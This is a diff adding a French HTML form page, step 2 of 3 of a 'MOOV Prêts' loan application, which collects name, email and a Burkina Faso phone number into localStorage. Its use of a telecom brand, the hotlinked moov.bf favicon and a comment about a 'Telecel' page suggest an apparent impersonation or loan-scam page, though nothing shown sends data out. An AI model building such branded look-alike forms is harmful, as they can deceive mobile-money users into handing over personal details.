@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=yes">
+    <title>MOOV Prêts – Vos coordonnées</title>
+    <link rel="icon" href="https://moov.bf/favicon.ico" type="image/x-icon">
+    <meta name="theme-color" content="#E8701A">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --moov-orange: #E8701A;
+            --moov-darkorange: #c95f10;
+            --moov-blue: #1A6DBF;
+            --moov-darkblue: #0f4f8a;
+            --black: #1a1a1a;
+            --gray: #6b7a8f;
+            --lightgray: #f5f6f8;
+            --shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
+            --shadow-hover: 0 12px 32px rgba(0, 0, 0, 0.12);
+            --border-radius: 20px;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--lightgray);
+            color: var(--black);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding: 12px;
+        }
+
+        header {
+            width: 100%;
+            max-width: 480px;
+            padding: 12px 16px;
+            text-align: center;
+            margin: 0 auto 12px;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.06);
+            position: relative;
+        }
+
+        .back-btn {
+            font-size: 28px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: var(--black);
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            line-height: 1;
+            transition: transform 0.2s;
+        }
+        .back-btn:hover { transform: translateY(-50%) scale(1.1); }
+
+        .logo {
+            font-size: clamp(28px, 7vw, 40px);
+            font-weight: 800;
+            letter-spacing: -0.5px;
+        }
+
+        .logo-moov {
+            color: var(--moov-orange);
+        }
+
+        .logo-pret {
+            color: var(--moov-blue);
+        }
+
+        main {
+            flex: 1;
+            max-width: 480px;
+            width: 100%;
+            margin: 0 auto;
+            position: relative;
+        }
+
+        .form-card {
+            background: white;
+            border-radius: var(--border-radius);
+            padding: 24px 18px 32px;
+            box-shadow: var(--shadow);
+            position: relative;
+            border: 1px solid rgba(0,0,0,0.04);
+            transition: transform 0.25s ease, box-shadow 0.25s ease;
+        }
+
+        .form-card:hover {
+            transform: translateY(-3px);
+            box-shadow: var(--shadow-hover);
+        }
+
+        /* Top stripe */
+        .form-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 5px;
+            background: linear-gradient(90deg, var(--moov-orange), var(--moov-blue));
+            border-radius: var(--border-radius) var(--border-radius) 0 0;
+        }
+
+        /* Error box – comme la page Telecel */
+        .error-box {
+            position: absolute;
+            top: 12px;
+            left: 12px;
+            right: 12px;
+            background: #fff;
+            border: 2px solid #ff4d4d;
+            border-radius: 14px;
+            padding: 12px;
+            display: none;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.12);
+            z-index: 100;
+            text-align: left;
+        }
+
+        .error-title {
+            color: #ff0000;
+            font-weight: bold;
+            font-size: 14px;
+            margin-bottom: 4px;
+        }
+
+        .error-text {
+            color: #444;
+            font-size: 13px;
+        }
+
+        .close {
+            position: absolute;
+            right: 12px;
+            top: 8px;
+            cursor: pointer;
+            font-size: 20px;
+            color: #999;
+        }
+
+        .form-title {
+            font-size: clamp(24px, 6vw, 32px);
+            font-weight: 700;
+            color: var(--black);
+            text-align: center;
+            margin-bottom: 1.2rem;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: #e9ecef;
+            border-radius: 4px;
+            margin: 1rem auto 0.8rem;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            width: 66.66%;
+            height: 100%;
+            background: linear-gradient(90deg, var(--moov-orange), var(--moov-darkorange));
+            border-radius: 4px;
+        }
+
+        .step-text {
+            text-align: center;
+            color: var(--gray);
+            font-size: 0.9rem;
+            margin-bottom: 1.8rem;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .form-label {
+            display: block;
+            font-weight: 600;
+            color: var(--black);
+            margin-bottom: 0.5rem;
+            font-size: 0.9rem;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 0.9rem 1rem;
+            border: 1px solid #ced4da;
+            border-radius: 10px;
+            font-size: 1rem;
+            background: #fdfdfe;
+            transition: all 0.2s;
+        }
+
+        .form-input:focus {
+            border-color: var(--moov-orange);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(232, 112, 26, 0.15);
+        }
+
+        .form-input.invalid,
+        #phoneGroup.invalid {
+            border-color: #dc3545 !important;
+            box-shadow: 0 0 0 3px rgba(220, 53, 69, 0.15) !important;
+        }
+
+        .name-group {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .name-group>div {
+            flex: 1;
+        }
+
+        .btn-group {
+            display: flex;
+            gap: 1rem;
+            margin-top: 2rem;
+        }
+
+        .prev-btn,
+        .next-btn {
+            flex: 1;
+            padding: 1rem;
+            border-radius: 12px;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.2s;
+            touch-action: manipulation;
+        }
+
+        .prev-btn {
+            background: #e2e8f0;
+            color: #475569;
+            border: none;
+        }
+        .prev-btn:active { transform: scale(0.97); }
+
+        .next-btn {
+            background: linear-gradient(135deg, var(--moov-orange), var(--moov-darkorange));
+            color: white;
+            border: none;
+            box-shadow: 0 6px 18px rgba(232, 112, 26, 0.3);
+        }
+        .next-btn:active { transform: scale(0.97); }
+
+        .next-btn.disabled-btn,
+        .next-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        footer {
+            padding: 20px 16px;
+            color: #adb5bd;
+            font-size: 12px;
+            text-align: center;
+            margin-top: auto;
+        }
+        footer a {
+            color: var(--moov-orange);
+            text-decoration: none;
+            font-weight: 600;
+        }
+        footer a:hover { text-decoration: underline; }
+
+        /* Spinner */
+        #spinner {
+            position: fixed;
+            inset: 0;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255, 255, 255, 0.8);
+            backdrop-filter: blur(2px);
+            z-index: 999;
+        }
+
+        .loader {
+            width: 44px;
+            height: 44px;
+            border: 4px solid #ffe0d0;
+            border-top: 4px solid var(--moov-orange);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Phone group */
+        #phoneGroup {
+            display: flex;
+            align-items: center;
+            border: 1px solid #ced4da;
+            border-radius: 10px;
+            padding: 0 1rem;
+            background: #fdfdfe;
+            transition: border 0.2s, box-shadow 0.2s;
+        }
+        #phoneGroup:focus-within {
+            border-color: var(--moov-orange);
+            box-shadow: 0 0 0 3px rgba(232, 112, 26, 0.15);
+        }
+        #phoneGroup span {
+            color: var(--gray);
+            font-weight: 500;
+            margin-right: 0.5rem;
+        }
+        #phoneGroup input {
+            flex: 1;
+            border: none;
+            outline: none;
+            padding: 0.9rem 0;
+            font-size: 1rem;
+            background: transparent;
+        }
+
+        @media (max-width: 380px) {
+            body { padding: 8px; }
+            .form-card { padding: 20px 14px; }
+            .form-input, #phoneGroup input { padding: 0.8rem 0.9rem; font-size: 0.9rem; }
+            .name-group { flex-direction: column; gap: 0.8rem; margin-bottom: 0.8rem; }
+            .btn-group { flex-direction: column; gap: 0.8rem; }
+            .prev-btn, .next-btn { padding: 0.8rem; font-size: 0.9rem; }
+        }
+
+        @media (min-width: 769px) {
+            body { padding: 32px; }
+            .form-card { padding: 2.5rem 3rem; }
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <button class="back-btn" onclick="history.back()">←</button>
+        <div class="logo"><span class="logo-moov">MOOV</span><span class="logo-pret">Prêts</span></div>
+    </header>
+
+    <main>
+        <div class="form-card">
+            <!-- Error box -->
+            <div class="error-box" id="errorBox">
+                <div class="close" onclick="hideError()">×</div>
+                <div class="error-title">Erreur</div>
+                <div class="error-text" id="errorText">Veuillez corriger les champs en rouge.</div>
+            </div>
+
+            <h1 class="form-title">Vos coordonnées</h1>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+            <div class="step-text">Étape 2 sur 3</div>
+
+            <div class="name-group">
+                <div>
+                    <label class="form-label">Prénom</label>
+                    <input type="text" class="form-input" id="firstName" placeholder="ex. Amadou">
+                </div>
+                <div>
+                    <label class="form-label">Nom</label>
+                    <input type="text" class="form-input" id="lastName" placeholder="ex. Diallo">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Adresse e-mail</label>
+                <input type="email" class="form-input" id="email" placeholder="ex. amadou.diallo@exemple.com">
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Numéro de téléphone</label>
+                <div id="phoneGroup">
+                    <span>+226</span>
+                    <input type="tel" id="phone" placeholder="70 12 34 56" maxlength="11" inputmode="numeric">
+                </div>
+            </div>
+
+            <div class="btn-group">
+                <button class="prev-btn" onclick="history.back()">PRÉCÉDENT</button>
+                <button class="next-btn" id="nextBtn">ÉTAPE SUIVANTE</button>
+            </div>
+        </div>
+    </main>
+
+    <footer>
+        © 2026 MOOV Prêts – Services financiers agréés | Propulsé par Mobile Money<br>
+        <a href="mailto:support@moovpret.bf">support@moovpret.bf</a>
+    </footer>
+
+    <!-- Spinner -->
+    <div id="spinner">
+        <div class="loader"></div>
+    </div>
+
+    <script>
+        // ===== DOM elements =====
+        const firstNameInput = document.getElementById('firstName');
+        const lastNameInput = document.getElementById('lastName');
+        const emailInput = document.getElementById('email');
+        const phoneInput = document.getElementById('phone');
+        const phoneGroup = document.getElementById('phoneGroup');
+        const nextBtn = document.getElementById('nextBtn');
+        const spinner = document.getElementById('spinner');
+        const errorBox = document.getElementById('errorBox');
+        const errorText = document.getElementById('errorText');
+
+        // Charger les données depuis localStorage
+        if (localStorage.getItem('firstName')) firstNameInput.value = localStorage.getItem('firstName');
+        if (localStorage.getItem('lastName')) lastNameInput.value = localStorage.getItem('lastName');
+        if (localStorage.getItem('email')) emailInput.value = localStorage.getItem('email');
+        if (localStorage.getItem('phone')) phoneInput.value = localStorage.getItem('phone');
+
+        // ===== Gestion des erreurs =====
+        function showError(message) {
+            errorText.innerText = message || 'Veuillez corriger les champs en rouge.';
+            errorBox.style.display = 'block';
+        }
+
+        function hideError() {
+            errorBox.style.display = 'none';
+        }
+        window.hideError = hideError;
+
+        function resetInvalidHighlights() {
+            document.querySelectorAll('.form-input, #phoneGroup').forEach(el => {
+                el.classList.remove('invalid');
+            });
+        }
+
+        // ===== Validation =====
+        function isValidPhoneNumber(phoneDigits) {
+            return /^\d{8,11}$/.test(phoneDigits); // accepte 8 à 11 chiffres (format Burkina)
+        }
+
+        function validateForm() {
+            let isValid = true;
+            let errorMsg = '';
+            resetInvalidHighlights();
+            hideError();
+
+            const firstName = firstNameInput.value.trim();
+            const lastName = lastNameInput.value.trim();
+            const phoneRaw = phoneInput.value.trim();
+
+            if (!firstName || firstName.length < 2) {
+                firstNameInput.classList.add('invalid');
+                isValid = false;
+                errorMsg = 'Le prénom est requis (minimum 2 caractères).';
+            }
+
+            if (!lastName || lastName.length < 2) {
+                lastNameInput.classList.add('invalid');
+                isValid = false;
+                if (!errorMsg) errorMsg = 'Le nom est requis (minimum 2 caractères).';
+            }
+
+            if (!phoneRaw) {
+                phoneGroup.classList.add('invalid');
+                isValid = false;
+                errorMsg = 'Le numéro de téléphone est requis.';
+            } else if (!/^\d{8,11}$/.test(phoneRaw)) {
+                phoneGroup.classList.add('invalid');
+                isValid = false;
+                errorMsg = 'Le numéro doit comporter 8 à 11 chiffres (ex: 70123456).';
+            }
+
+            const email = emailInput.value.trim();
+            if (email && (!email.includes('@') || !email.includes('.') || email.length < 5)) {
+                emailInput.classList.add('invalid');
+                isValid = false;
+                errorMsg = 'Veuillez entrer une adresse e-mail valide.';
+            }
+
+            if (!isValid) {
+                showError(errorMsg || 'Veuillez corriger les champs en rouge.');
+                const firstInvalid = document.querySelector('.invalid');
+                if (firstInvalid) firstInvalid.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                return false;
+            }
+            return true;
+        }
+
+        // ===== Envoi et redirection =====
+        let isProcessing = false;
+
+        function proceedToSummary() {
+            if (isProcessing) return;
+            if (!validateForm()) return;
+
+            // Sauvegarde
+            localStorage.setItem('firstName', firstNameInput.value.trim());
+            localStorage.setItem('lastName', lastNameInput.value.trim());
+            localStorage.setItem('email', emailInput.value.trim());
+            localStorage.setItem('phone', phoneInput.value.trim());
+
+            nextBtn.disabled = true;
+            nextBtn.classList.add('disabled-btn');
+            isProcessing = true;
+            spinner.style.display = 'flex';
+
+            setTimeout(() => {
+                window.location.href = 'summary.html';
+            }, 3000);
+        }
+
+        // ===== Événements =====
+        nextBtn.addEventListener('click', proceedToSummary);
+
+        // Effacer les erreurs au fur et à mesure de la saisie
+        const clearErrorOnInput = (el) => {
+            el.addEventListener('input', () => {
+                hideError();
+                el.classList.remove('invalid');
+                if (el.id === 'phone') phoneGroup.classList.remove('invalid');
+            });
+        };
+        clearErrorOnInput(firstNameInput);
+        clearErrorOnInput(lastNameInput);
+        clearErrorOnInput(emailInput);
+        clearErrorOnInput(phoneInput);
+
+        phoneInput.addEventListener('input', () => {
+            phoneGroup.classList.remove('invalid');
+            hideError();
+        });
+    </script>
+</body>
+</html>
